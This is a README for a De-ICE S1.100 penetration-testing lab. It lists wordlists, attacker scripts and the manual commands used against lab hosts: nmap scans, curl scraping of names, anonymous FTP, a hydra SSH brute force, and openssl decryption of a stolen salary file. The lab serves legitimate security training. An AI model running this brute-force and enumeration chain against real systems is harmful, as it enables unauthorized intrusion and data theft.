# De-ICE S1.100 Lab Files

This directory contains files for the penetration testing lab:

## Generated Files
- `users.txt` - Common usernames extracted from target
- `passwords.txt` - Weak password wordlist  
- `salary_dec2003.csv.enc` - Encrypted salary file from FTP
- `salary_dec2003.csv` - Decrypted salary data

## Attacker Scripts
Located in `/root/tools/`:
- `recon.sh` - Automated reconnaissance 
- `exploit.sh` - Exploitation automation

## Manual Commands

### Network Discovery
```bash
nmap -sn 10.10.10.0/24
nmap -sC -sV target-web target-ssh target-ftp
```

### Web Enumeration  
```bash
curl http://target-web
curl -s http://target-web | grep -E "(Name|Email)"
```

### FTP Enumeration
```bash
ftp target-ftp
# User: anonymous, Pass: anonymous
# Navigate to incoming/ directory
```

### SSH Brute Force
```bash
# Port 22, not 2222 — 2222 is only the host-machine mapping (docker-compose.yaml's
# "2222:22"). From inside the attacker container, the service is on its real port.
hydra -L users.txt -P passwords.txt target-ssh ssh
```

### SSH Access
```bash
ssh <username>@target-ssh
```

### File Decryption
```bash
openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "<password>"
```